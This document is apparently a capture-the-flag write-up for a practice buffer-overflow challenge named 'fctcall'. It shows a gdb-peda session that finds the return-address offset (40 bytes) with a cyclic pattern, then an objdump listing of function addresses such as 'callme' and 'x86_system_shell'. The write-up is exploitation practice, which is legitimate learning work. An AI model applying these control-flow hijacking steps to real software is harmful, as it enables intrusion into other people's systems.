# function call 




## Offset 

```
$ gdb fctcall 
gdb-peda$ pattern_create 60
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA'
gdb-peda$ r
Starting program: /home/yolo/yolo/BufferOverflows/challs/01_fctcall/build/fctcall 
Hello
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA
Bye
> 
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
...
RSP: 0x7fffffffdee8 ("AA0AAFAAbAA1AAGAAcAA\377\177")...
[-------------------------------------code-------------------------------------]
   0x4011d3 <pwnme+93>:	call   0x401060 <write@plt>
   0x4011d8 <pwnme+98>:	nop
   0x4011d9 <pwnme+99>:	leave  
=> 0x4011da <pwnme+100>:	ret  
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdee8 ("AA0AAFAAbAA1AAGAAcAA\377\177")
...
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011da in pwnme ()
gdb-peda$ 
gdb-peda$ pattern offset AA0AAFAAbAA1AAGAAcAA
AA0AAFAAbAA1AAGAAcAA found at offset: 40
```


## Fct adress 

```
$ objdump -d fctcall | grep \>:
0000000000401000 <_init>:
0000000000401020 <.plt>:
0000000000401060 <write@plt>:
0000000000401070 <strlen@plt>:
0000000000401080 <read@plt>:
0000000000401090 <_start>:
00000000004010c0 <_dl_relocate_static_pie>:
00000000004010d0 <deregister_tm_clones>:
0000000000401100 <register_tm_clones>:
0000000000401140 <__do_global_dtors_aux>:
0000000000401170 <frame_dummy>:
0000000000401176 <pwnme>:
00000000004011db <callme>:
0000000000401206 <x86_system_shell>:
000000000040120e <needle0>:
0000000000401210 <here>:
000000000040121e <there>:
000000000040122b <needle1>:
000000000040123e <usefull_strings>:
000000000040125a <usefull_gadgets>:
000000000040128c <tst>:
00000000004012b9 <main>:
00000000004012e0 <__libc_csu_init>:
0000000000401350 <__libc_csu_fini>:
0000000000401358 <_fini>:
```


